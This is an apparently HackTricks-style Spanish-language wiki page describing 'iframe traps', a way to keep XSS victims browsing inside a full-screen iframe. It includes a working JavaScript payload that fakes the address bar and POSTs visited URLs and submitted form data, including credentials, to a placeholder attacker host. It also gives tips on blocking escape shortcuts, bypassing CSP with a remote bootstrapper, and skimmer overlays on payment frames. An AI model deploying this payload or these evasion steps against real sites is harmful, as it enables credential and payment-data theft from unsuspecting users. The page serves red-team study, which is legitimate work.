# Iframe Traps

{{#include ../banners/hacktricks-training.md}}

## Información básica

Esta forma de abuso de XSS mediante iframes para robar información del usuario mientras se mueve por la página web fue publicada originalmente en estos 2 posts en trustedsec.com: [**here**](https://trustedsec.com/blog/persisting-xss-with-iframe-traps) y [**here**](https://trustedsec.com/blog/js-tap-weaponizing-javascript-for-red-teams).

El ataque comienza en una página vulnerable a XSS donde es posible hacer que las **víctimas no abandonen el XSS** haciendo que **naveguen dentro de un iframe** que ocupa toda la aplicación web.

El ataque XSS básicamente cargará la página web en un iframe que ocupa el 100% de la pantalla. Por lo tanto, la víctima **no notará que está dentro de un iframe**. Luego, si la víctima navega por la página haciendo clic en enlaces dentro del iframe (dentro del sitio), estará **navegando dentro del iframe** con el JS arbitrario cargado que roba información de esa navegación.

Además, para que sea más realista, es posible usar algunos **listeners** para comprobar cuándo un iframe cambia la ubicación de la página y actualizar la URL del navegador con esas ubicaciones, de modo que el usuario crea que está cambiando de página usando el navegador.

<figure><img src="../images/image (1248).png" alt=""><figcaption><p><a href="https://www.trustedsec.com/wp-content/uploads/2022/04/regEvents.png">https://www.trustedsec.com/wp-content/uploads/2022/04/regEvents.png</a></p></figcaption></figure>

<figure><img src="../images/image (1249).png" alt=""><figcaption><p><a href="https://www.trustedsec.com/wp-content/uploads/2022/04/fakeAddress-1.png">https://www.trustedsec.com/wp-content/uploads/2022/04/fakeAddress-1.png</a></p></figcaption></figure>

Además, es posible usar listeners para robar información sensible, no solo las otras páginas que la víctima está visitando, sino también los datos usados para **llenar formularios** y enviarlos (¿credenciales?) o para **robar el local storage**...

Por supuesto, las principales limitaciones son que una **víctima que cierre la pestaña o ponga otra URL en el navegador escapará del iframe**. Otra forma de hacerlo sería **refrescar la página**, sin embargo, esto podría ser parcialmente **evitado** deshabilitando el menú contextual de clic derecho cada vez que se carga una nueva página dentro del iframe o detectando cuando el ratón del usuario sale del iframe, potencialmente para hacer clic en el botón de recarga del navegador; en ese caso la URL del navegador se actualiza con la URL original vulnerable a XSS, por lo que si el usuario la recarga, volverá a ser comprometida (nota: esto no es muy sigiloso).

## Trampa modernizada (2024+)

* Usar un **full‑viewport iframe** más History/Navigation API para imitar una navegación real.

<details>
<summary>Full-viewport iframe trap</summary>
```html
<script>
const i=document.createElement('iframe');
i.src=location.href;
i.style='position:fixed;inset:0;border:0;width:100vw;height:100vh;z-index:999999;background:#fff';
document.body.appendChild(i);
function sync(url){history.replaceState({},'',url);}
i.addEventListener('load',()=>{
const w=i.contentWindow;
['hashchange','popstate'].forEach(ev=>w.addEventListener(ev,()=>sync(w.location.href)));
w.addEventListener('click',()=>fetch('//attacker/log',{method:'POST',body:w.location.href}));
w.document.addEventListener('submit',ev=>{
const fd=new FormData(ev.target);
fetch('//attacker/creds',{method:'POST',body:new URLSearchParams(fd)});
},true);
});
</script>
```
</details>

* **Navigation API** (`navigation.navigate`, `currententrychange`) mantiene la barra de URL externa sincronizada sin leaking de la URL real.
* Ve **fullscreen** para ocultar la UI del navegador y dibujar tu propia barra de direcciones/candado falso.

## Uso de overlay & skimmer

* Comerciantes comprometidos reemplazan hosted payment iframes (Stripe, Adyen, etc.) con un **pixel‑perfect overlay** que reenvía pulsaciones de teclado mientras el frame real queda debajo, a veces usando legacy validation APIs para que el flujo nunca falle.
* Atrapando a los usuarios en el top frame se captura información de **autofill/password‑manager** antes de que noten que la barra de URL nunca cambió.

## Trucos de evasión observados en investigación de 2025

* `about:blank`/`data:` local frames heredan el origen del padre y evaden algunas heurísticas de bloqueadores de contenido; los iframes anidados pueden reaparecer incluso cuando las extensiones destruyen frames de terceros.
* **Permission propagation**: reescribir el atributo `allow` del parent otorga a los frames anidados del atacante fullscreen/camera/microphone sin cambios DOM evidentes.

## Quick OPSEC tips

* Re‑focus el iframe cuando el ratón salga (`mouseleave` on body) para evitar que los usuarios alcancen la UI del navegador.
* Deshabilita el menú contextual y atajos comunes (`keydown` para `F11`, `Ctrl+L`, `Ctrl+T`) dentro del frame para ralentizar los intentos de escape.
* Si CSP bloquea scripts inline, inyecta un bootstrapper remoto y habilita `srcdoc` en el iframe para que tu payload viva fuera del CSP aplicado en la página principal.

## Related

{{#ref}}
clickjacking.md
{{#endref}}



## References

- [Iframe security exposed: blind spot fueling payment skimmer attacks (2025)](https://thehackernews.com/2025/09/iframe-security-exposed-blind-spot.html)
- [Local Frames: exploiting inherited origins to bypass blockers (2025)](https://arxiv.org/abs/2506.00317)
{{#include ../banners/hacktricks-training.md}}
